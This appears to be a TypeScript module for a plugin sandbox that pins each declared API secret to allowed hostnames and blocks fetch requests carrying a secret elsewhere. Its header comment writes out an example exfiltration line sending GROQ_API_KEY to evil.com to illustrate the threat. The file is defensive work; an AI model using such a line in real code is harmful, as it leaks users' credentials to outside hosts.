// Per-secret host binding — defence against the
// "declare benign-looking network capability, smuggle secret out" attack.
//
// Threat: a malicious BLANK.md declares
//
//   network: [api.groq.com, evil.com]
//   secrets: [GROQ_API_KEY]
//
// then `await ctx.fetch('https://evil.com', { headers: { x: ctx.secrets.GROQ_API_KEY }})`
// exfiltrates the key. The network allow-list alone isn't enough —
// the blank needs both endpoints (one for legit use, one for
// exfiltration), and a permissive hostname check lets it have both.
//
// Defence: each declared secret can be bound to a set of hostnames.
// When ctx.fetch fires, we scan the outgoing request (URL, headers,
// body) for any secret VALUE; if found, the request's target host
// must be in that secret's binding list. Otherwise refuse.
//
// Frontmatter:
//
//   secrets: [GROQ_API_KEY, FINNHUB_API_KEY]
//   secret-hosts.GROQ_API_KEY: [api.groq.com]
//   secret-hosts.FINNHUB_API_KEY: [finnhub.io]
//
// Secrets without bindings are unrestricted — they can flow anywhere
// the network allow-list permits (backwards compat for existing blanks
// that haven't opted in). Secrets WITH bindings are pinned.

export interface BoundSecret {
  /** Env-var name (only used in error messages). */
  readonly name: string;
  /** The secret value to scan for. Empty / undefined are skipped. */
  readonly value: string;
  /** Hostnames where this secret may legitimately appear. Empty array =
   *  no binding (unrestricted; flow allowed wherever fetch allows). */
  readonly allowedHosts: readonly string[];
}

export interface RequestParts {
  /** Target hostname (already lowercased). */
  readonly hostname: string;
  /** Full URL — searched as a string for secret values. */
  readonly url: string;
  /** Headers, stringified. */
  readonly headers: string;
  /** Body, stringified (if not string-like, "") */
  readonly body: string;
}

export function buildRequestParts(url: string, init?: RequestInit): RequestParts {
  let hostname = '';
  try { hostname = new URL(url).hostname.toLowerCase(); } catch { /* validated upstream */ }

  let headers = '';
  if (init?.headers) {
    if (init.headers instanceof Headers) {
      const parts: string[] = [];
      init.headers.forEach((v, k) => parts.push(`${k}: ${v}`));
      headers = parts.join('\n');
    } else if (Array.isArray(init.headers)) {
      headers = init.headers.map(([k, v]) => `${k}: ${v}`).join('\n');
    } else {
      headers = Object.entries(init.headers as Record<string, string>)
        .map(([k, v]) => `${k}: ${v}`).join('\n');
    }
  }

  let body = '';
  const b = init?.body;
  if (typeof b === 'string') body = b;
  // FormData/Blob/etc. — can't cheaply scan; conservatively treat as
  // a leak risk by stringifying. Most user blanks send JSON strings.
  else if (b && typeof (b as { toString?: () => string }).toString === 'function') {
    try { body = String(b); } catch { body = ''; }
  }

  return { hostname, url, headers, body };
}

/**
 * Throws if any bound secret's value appears in the request parts AND
 * the target hostname isn't in that secret's allowed-host list.
 */
export function enforceSecretBindings(
  parts: RequestParts,
  secrets: readonly BoundSecret[],
): void {
  for (const sec of secrets) {
    if (!sec.value) continue;
    if (sec.allowedHosts.length === 0) continue; // unrestricted
    if (sec.allowedHosts.some(h => h.toLowerCase() === parts.hostname)) continue;

    const present =
      parts.url.includes(sec.value) ||
      parts.headers.includes(sec.value) ||
      parts.body.includes(sec.value);

    if (present) {
      throw new Error(
        `ctx.fetch: secret "${sec.name}" is bound to [${sec.allowedHosts.join(', ')}], ` +
        `cannot be sent to "${parts.hostname}" (declared secret-hosts.${sec.name} in BLANK.md)`,
      );
    }
  }
}
